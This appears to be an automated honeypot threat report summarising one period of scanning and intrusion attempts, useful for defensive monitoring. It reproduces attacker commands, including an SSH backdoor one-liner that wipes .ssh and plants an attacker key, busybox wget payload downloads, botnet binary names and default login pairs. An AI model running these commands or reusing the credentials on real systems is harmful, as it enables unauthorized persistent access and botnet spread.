
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-28T06:01:35Z
**Timeframe of Analysis:** Approximately 2025-10-28T05:20:00Z to 2025-10-28T06:00:00Z
**Log Files Analyzed:**
- agg_log_20251028T052001Z.json
- agg_log_20251028T054001Z.json
- agg_log_20251028T060002Z.json

---

### **Executive Summary**

This report summarizes 19,606 events captured across multiple honeypots. The primary activity observed was automated scanning and exploitation attempts. The Cowrie honeypot, emulating SSH and Telnet, recorded the highest volume of interactions (6,186 events). A significant portion of attacks originated from IP address `171.246.177.44`, primarily targeting SMB on port 445. Attackers were observed attempting to download and execute various malicious scripts and ELF binaries, indicating efforts to propagate botnets. A consistent pattern of SSH-based attacks involved attempts to clear existing SSH configurations and install a new authorized key for persistent access. Network signatures from threat intelligence feeds (Dshield, Spamhaus) were frequently triggered, confirming that many attacking IPs are known malicious actors.

---

### **Detailed Analysis**

**Attacks by Honeypot Type:**
- Cowrie: 6,186
- Dionaea: 3,603
- Honeytrap: 3,636
- Suricata: 2,017
- Ciscoasa: 2,022
- Sentrypeer: 1,893
- Adbhoney: 63
- Mailoney: 89
- H0neytr4p: 31
- Redishoneypot: 23
- Tanner: 13
- ConPot: 11
- Honeyaml: 11
- ElasticPot: 5
- Miniprint: 2
- Ipphoney: 1

**Top 20 Attacking IPs:**
- 171.246.177.44: 3125
- 144.172.108.231: 1132
- 198.98.55.71: 359
- 180.242.216.184: 348
- 165.154.36.71: 335
- 170.254.229.191: 346
- 185.243.5.121: 444
- 24.232.50.5: 305
- 168.227.224.196: 288
- 172.173.139.18: 253
- 181.28.101.14: 257
- 182.75.216.74: 209
- 163.172.99.31: 323
- 88.210.63.16: 292
- 20.193.141.133: 276
- 147.50.103.212: 188
- 14.29.196.13: 139
- 103.23.199.72: 256
- 27.110.166.67: 129
- 34.91.0.68: 129

**Top Targeted Ports/Protocols:**
- 445: 3478
- 5060: 1893
- 22: 747
- 5901: 228
- 2095: 156
- 8333: 145
- 1433: 83
- 5903: 130
- 9042/9043: 113
- 25: 89
- TCP/22: 73
- 23: 40

**Most Common CVEs Detected:**
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-1999-0183
- CVE-1999-0265
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255
- CVE-2021-35394 CVE-2021-35394
- CVE-2006-3602 CVE-2006-4458 CVE-2006-4542
- CVE-2005-4050

**Top Commands Attempted by Attackers:**
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `lockr -ia .ssh`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `w`
- `crontab -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `Enter new UNIX password:`
- `cd /data/local/tmp/; busybox wget http://...`
- `cd /data/local/tmp/; rm *; busybox wget http://...`

**Top Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1 (2402000)
- ET SCAN MS Terminal Server Traffic on Non-standard Port (2023753)
- ET SCAN NMAP -sS window 1024 (2009582)
- ET HUNTING RDP Authentication Bypass Attempt (2034857)
- ET INFO Reserved Internal IP Traffic (2002752)
- ET INFO curl User-Agent Outbound (2013028)
- ET HUNTING curl User-Agent to Dotted Quad (2034567)
- ET DROP Spamhaus DROP Listed Traffic Inbound

**Top Users / Login Attempts (user/pass):**
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- root/
- root/K8tby3Nr
- root/KabnaFly2012
- root/KabZ
- root/Kaika2015
- kali/kali
- hadoop/p@ssw0rd
- threedsystem/threedsystem
- mustafa/mustafa

**Files Uploaded/Downloaded:**
- wget.sh
- w.sh
- c.sh
- arm.urbotnetisass
- mips.urbotnetisass
- x86_32.urbotnetisass
- arm.uhavenobotsxd
- mips.uhavenobotsxd
- x86_32.uhavenobotsxd
- bot.html

**HTTP User-Agents:**
- *No HTTP User-Agents recorded in this period.*

**SSH Clients:**
- *No SSH client versions recorded in this period.*

**SSH Servers:**
- *No SSH server versions recorded in this period.*

**Top Attacker AS Organizations:**
- *No AS organization data recorded in this period.*

---

### **Key Observations and Anomalies**

1.  **High-Volume SMB Scans:** The Dionaea honeypot captured an unusually high number of events (3,478) targeting port 445 (SMB), almost entirely from a single IP (`171.246.177.44`), suggesting a targeted scan or worm-like activity from that source.
2.  **Persistent SSH Backdoor Attempts:** A recurring set of commands across numerous sessions indicates a coordinated campaign to gain persistent SSH access. The commands systematically remove existing `.ssh` directories and insert a specific public key, `mdrfckr`.
3.  **Botnet Deployment:** Attackers attempted to download and execute scripts and binaries tailored for different CPU architectures (ARM, MIPS, x86). The filenames, such as `uhavenobotsxd` and `urbotnetisass`, strongly suggest these are components of botnets intended for IoT or embedded devices.
4.  **SIP/VoIP Scanning:** Port 5060 (SIP) was the second most targeted port, indicating widespread, automated scanning for vulnerabilities in VoIP systems. This activity was primarily captured by the Sentrypeer honeypot.
5.  **Lack of Sophistication:** The majority of login attempts used common or default credential pairs (e.g., `kali/kali`, `root/test123123`). The commands executed post-breach are generic and appear to be from automated toolkits rather than manual, targeted intrusions.
---
